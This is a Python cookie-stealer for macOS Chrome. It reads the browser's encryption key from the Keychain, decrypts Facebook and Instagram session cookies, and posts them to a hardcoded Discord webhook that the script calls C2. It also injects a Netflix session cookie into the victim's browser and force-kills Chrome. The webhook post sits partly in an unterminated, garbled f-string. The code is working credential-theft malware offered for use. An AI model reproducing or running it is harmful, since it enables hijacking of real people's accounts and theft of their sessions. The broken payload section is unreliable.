import os
import sqlite3
import json
import keyring
import shutil
import requests
import subprocess
import time
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

# --- SURGICAL CONFIGURATION ---
# Note: Using your provided Webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"

# Standard Paths for MacBook Pro M1
CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db")

def kill_chrome():
    """Closes Chrome properly to release the database lock."""
    print("[*] Locking out Google Chrome processes...")
    subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
    time.sleep(2)

def get_encryption_key():
    """Handshake with the macOS Keychain to retrieve the Master Key."""
    print("[*] Interrogating macOS Keychain for Chrome Safe Storage...")
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password:
        return None
    # Derive key: Salt 'saltysalt', 1003 iterations (Standard Chrome)
    return PBKDF2(password, b'saltysalt', 16, count=1003)

def decrypt_value(enc_value, key):
    """Bypasses v10 header and decrypts AES-128-CBC."""
    try:
        iv = b' ' * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc_value[3:])
        # Clean up PKCS7 padding
        return decrypted[:-decrypted[-1]].decode('utf-8')
    except Exception:
        return None

def execute_protocol():
    print(f"[*] Command Center Active. Session: {os.getlogin()}")
    
    if not os.path.exists(CHROME_PATH):
        print(f"[!] Error: Chrome Path invalid or browser not installed.")
        return

    # 1. Create the Shadow Copy
    print("[*] Initializing Shadow Copy of the cookie database...")
    try:
        shutil.copyfile(CHROME_PATH, TEMP_DB)
    except Exception as e:
        print(f"[!] File Copy Error: {e}")
        return

    conn = sqlite3.connect(TEMP_DB)
    cursor = conn.cursor()
    
    try:
        key = get_encryption_key()
        if not key:
            print("[!] Error: Keychain access denied. Script terminated.")
            return

        # 2. Meta Extraction (FB & IG)
        print("[*] Extracting Meta session tokens...")
        query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%'"
        cursor.execute(query)
        
        exfiltration_data = []
        for host, name, enc_val in cursor.fetchall():
            decrypted = decrypt_value(enc_val, key)
            if decrypted:
                exfiltration_data.append({
                    "domain": host,
                    "name": name,
                    "value": decrypted
                })

        # 3. Exfiltration to Discord
        if exfiltration_data:
            print(f"[+] {len(exfiltration_data)} tokens secured. Transmitting to C2...")
            # Fixed the indentation error and the payload structure here
            payload = {
                "content": f"**STRIKE SUCCESS**\nUser: {os.getlogin()}\nFound: {len(exfiltration_data)} tokens",
                "embeds": [{
                    "title": "Meta Session Data",
                    "description": f"
            "color": 3447003
                }]
            }
            requests.post(DISCORD_WEBHOOK, json=payload)
        else:
            print("[!] No Meta tokens found in local storage.")

        # 4. Netflix Injection (The persistence move)
        if NETFLIX_COOKIE_VAL:
            print("[*] Injecting Persistence Layer (Netflix)...")
            now_ts = int((time.time() + 11644473600) * 1000000)
            expiry = 13350000000000000 # 2027+
            
            sql = """
                INSERT OR REPLACE INTO cookies 
                (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """
            params = (now_ts, '.netflix.com', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
            
            cursor.execute(sql, params)
            conn.commit()
            print("[+] Persistence injected.")

    except Exception as e:
        print(f"[!] Critical Error: {e}")
    finally:
        conn.close()
        
        # 5. Final Sync (Must close Chrome)
        kill_chrome()
        try:
            print("[*] Syncing local nodes with system storage...")
            shutil.copyfile(TEMP_DB, CHROME_PATH)
            if os.path.exists(TEMP_DB):
                os.remove(TEMP_DB)
            print("[+++] Protocol Complete. All nodes synchronized.")
        except Exception as e:
            print(f"[!] Final Sync Error: Ensure Chrome is fully closed (CMD+Q). {e}")

if __name__ == "__main__":
    execute_protocol()
